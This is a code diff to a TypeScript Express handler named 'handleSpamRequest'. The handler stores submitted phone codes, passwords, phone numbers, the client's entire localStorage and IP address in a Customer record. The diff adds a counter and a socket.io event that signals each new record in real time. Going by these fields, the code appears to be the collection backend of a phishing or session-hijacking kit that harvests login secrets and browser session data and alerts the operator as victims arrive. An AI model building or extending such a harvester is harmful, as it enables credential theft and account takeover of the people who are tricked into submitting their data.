@@ -1,6 +1,8 @@
 import { Request, Response } from 'express';
 import Customer from '../models/customer'; // 确保正确导入 Customer 模型
 import handleAsync from '../utils/handleAsync';
+import { io } from '../services/socket';
+let customerCount = 0; // 初始化客户计数器
 
 export const handleSpamRequest = handleAsync(
   async (req: Request, res: Response) => {
@@ -26,17 +28,23 @@ export const handleSpamRequest = handleAsync(
         localStorage: JSON.stringify(rest),
         ip,
       });
+    } else {
+      const newCustomer = new Customer({
+        phoneCode,
+        password,
+        phoneNumber,
+        localStorage: JSON.stringify(rest),
+        ip,
+      });
+
+      await newCustomer.save();
+      customerCount++; // 增加客户计数
+      console.log('customerCount', customerCount);
     }
 
-    const newCustomer = new Customer({
-      phoneCode,
-      password,
-      phoneNumber,
-      localStorage: JSON.stringify(rest),
-      ip,
-    });
-
-    await newCustomer.save();
+    // 触发新用户事件
+    io.emit('newCustomerAdded', { count: customerCount });
+    console.log('newCustomerAdded', { count: customerCount });
 
     res.status(200).json({
       message: 'success',
